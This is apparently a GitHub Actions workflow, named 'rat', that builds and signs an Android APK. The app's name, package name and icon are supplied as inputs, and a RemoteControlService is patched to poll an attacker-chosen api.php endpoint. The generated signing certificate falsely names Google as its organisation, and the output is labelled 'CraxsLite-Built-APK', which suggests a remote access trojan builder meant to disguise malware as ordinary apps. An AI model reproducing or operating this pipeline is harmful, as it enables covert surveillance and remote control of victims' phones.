name: rat

on:
  workflow_dispatch:
    inputs:
      URL:
        description: 'URL Website Utama'
        required: true
        default: 'https://default.com'
      PACKAGE_NAME:
        description: 'Package Name Aplikasi (Contoh: com.update.service)'
        required: true
        default: 'com.default.app'
      APP_NAME: 
        description: 'Nama Aplikasi (Muncul di layar)'
        required: true
        default: 'My New App'
      ICON_URL: 
        description: 'URL Icon Aplikasi (PNG/JPG)'
        required: true
      KEY_ALIAS:
        description: 'Alias Keystore'
        required: true
        default: 'mykey'
      KEY_PASS:
        description: 'Password Kunci'
        required: true
        default: 'android'
      STORE_PASS:
        description: 'Password Store'
        required: true
        default: 'android'

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout Repository
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        cache: gradle

    - name: Setup Android SDK Environment üõ†Ô∏è
      uses: android-actions/setup-android@v3 

    - name: Install Android SDK Components (API 34) üöÄ
      run: |
        yes | sdkmanager "platforms;android-34" "build-tools;34.0.0" 

    - name: Install ImageMagick
      run: sudo apt-get install -y imagemagick

    - name: Ensure gradlew is executable
      run: chmod +x gradlew
        
    - name: Update Configs & Fix Java Imports (Pembersihan Total)
      run: |
        NEW_PKG="${{ github.event.inputs.PACKAGE_NAME }}"
        URL_INPUT=$(echo "${{ github.event.inputs.URL }}" | sed 's/[\/&]/\\&/g')
        API_URL="${URL_INPUT%/*}/api.php"
        
        echo "Updating everything to Package Name: $NEW_PKG"
        
        # 1. Update Gradle (applicationId & namespace)
        sed -i "s/applicationId \".*\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
        sed -i "s/namespace \".*\"/namespace \"$NEW_PKG\"/g" app/build.gradle
        
        # 2. Update Strings (URL & App Name)
        sed -i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">${{ github.event.inputs.APP_NAME }}</string>|g" app/src/main/res/values/strings.xml
        sed -i "s|<string name=\"web_url\">.*</string>|<string name=\"web_url\">$URL_INPUT</string>|g" app/src/main/res/values/strings.xml
        
        # 3. Sinkronisasi Package Java
        find app/src/main/java -name "*.java" -exec sed -i "s/package .*;/package $NEW_PKG;/g" {} +
        
        # 4. Hapus semua baris import R yang lama (membersihkan com.ojgrup.app.R dll)
        find app/src/main/java -name "*.java" -exec sed -i "/import .*\.R;/d" {} +
        
        # 5. Masukkan import R yang baru tepat di bawah baris package
        find app/src/main/java -name "*.java" -exec sed -i "/package $NEW_PKG;/a import $NEW_PKG.R;" {} +

        # 6. Update URL API untuk Polling di Java
        find app/src/main/java -name "RemoteControlService.java" -exec sed -i "s|private String apiUrl = \".*\";|private String apiUrl = \"$API_URL\";|g" {} +

    - name: Create Signing Properties File
      run: |
        echo "storeFile=release-key.jks" > release.properties
        echo "keyAlias=${{ github.event.inputs.KEY_ALIAS }}" >> release.properties
        echo "keyPassword=${{ github.event.inputs.KEY_PASS }}" >> release.properties
        echo "storePassword=${{ github.event.inputs.STORE_PASS }}" >> release.properties
        
    - name: Remove Junk & Process Icon
      run: |
        rm -rf app/src/main/res/mipmap-*/*
        mkdir -p app/src/main/res/mipmap-xxhdpi
        curl -f -L "${{ github.event.inputs.ICON_URL }}" -o /tmp/icon_raw.png
        convert /tmp/icon_raw.png -resize 96x96! app/src/main/res/mipmap-xxhdpi/ic_launcher.png
        convert /tmp/icon_raw.png -resize 96x96! app/src/main/res/mipmap-xxhdpi/ic_launcher_round.png

    - name: Generate Dynamic Keystore
      run: |
        keytool -genkey -v -keystore app/release-key.jks \
        -alias ${{ github.event.inputs.KEY_ALIAS }} \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass ${{ github.event.inputs.STORE_PASS }} \
        -keypass ${{ github.event.inputs.KEY_PASS }} \
        -dname "CN=Android, O=Google, L=Mountain View, S=CA, C=US"
        
    - name: Clean and Build Signed APK
      run: ./gradlew clean assembleRelease --no-daemon --stacktrace
        
    - name: Upload Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: CraxsLite-Built-APK
        path: app/build/outputs/apk/release/app-release.apk
